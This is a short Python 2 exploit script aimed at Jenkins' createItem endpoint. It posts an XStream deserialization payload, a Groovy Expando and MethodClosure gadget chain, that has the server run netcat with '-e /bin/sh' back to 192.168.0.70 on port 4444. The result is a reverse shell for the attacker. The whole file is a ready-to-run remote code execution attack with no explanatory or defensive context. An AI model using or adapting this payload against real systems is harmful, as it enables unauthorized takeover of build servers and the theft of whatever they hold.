import requests
import sys
import random

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def main():
	if len(sys.argv) != 2:
		print "(+) usage: %s <target>" % sys.argv[0]
		print '(+) eg: %s 192.168.1.100' % sys.argv[0]

		sys.exit(-1)

	ip = sys.argv[1]

	proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
	headers = {'Content-type': 'text/xml'}

	randName = str(random.randint(1,99999))
	target = "http://%s/jenkins/createItem?name=%s" % (ip, randName)
	print "Posting to " + target + "..."
	d = """<map><entry><groovy.util.Expando><expandoProperties><entry><string>hashCode</string><org.codehaus.groovy.runtime.MethodClosure><delegate class="groovy.util.Expando"/><owner class="java.lang.ProcessBuilder"><command><string>/usr/bin/nc</string><string>192.168.0.70</string><string>4444</string><string>-e</string><string>/bin/sh</string></command></owner><method>start</method></org.codehaus.groovy.runtime.MethodClosure></entry></expandoProperties></groovy.util.Expando><int>1</int></entry></map>"""

	s = requests.Session()
	r = s.post(target, data=d, proxies=proxies, headers=headers)
	
if __name__ == "__main__":
	main()


